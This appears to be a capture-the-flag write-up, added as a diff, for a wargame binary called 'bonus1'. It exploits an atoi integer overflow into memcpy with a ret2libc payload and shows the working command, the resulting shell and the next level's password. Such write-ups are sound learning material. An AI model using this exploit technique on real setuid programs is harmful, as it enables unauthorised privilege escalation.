@@ -1,0 +1,38 @@
+For the bonus1, the binary takes two arguments.
+
+The first is a string for atoi.
+If the return of atoi is greater than 9 the program stops.
+In assembly code, we found that the return value of atoi is multiplied by 4.
+
+   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
+
+And the result is use as parameter of size for memcpy.
+To pass the condition we send a number under 9, when multiplied with 4 
+will allow the overflow on an unsigned.
+
+- (UINT_MAX / 4) = - (4294967295 / 4) = -1073741823
+
+For the overflow we take little bit greater = -1073741803.
+
+The second argument is a string too, which is used by memcpy as a source.
+So we have to exploit the memcpy with a "ret2libc" method.
+We have to find the offset to control eip.
+
+With a pattern generator we find the offset at 56.
+Now we can control eip, we can use a "/bin/sh" string, it's stocked at: 0x8048583.
+We can use it with the system function ;
+
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+For that we send:
+
+./bonus1 [arg1] [PADDING + ADDRESS SYSTEM + 4 BYTES + ADDRESS /bin/sh]
+
+The 4 bytes between adress are used to skip the return adress of the main function.
+
+./bonus1 "-1073741803" $(python -c 'print "A" * 56 + "\x60\xb0\xe6\xb7" + "OUAI" + "\x83\x85\x04\x08"')
+$ id
+uid=2011(bonus1) gid=2011(bonus1) euid=2012(bonus2) egid=100(users) groups=2012(bonus2),100(users),2011(bonus1)
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
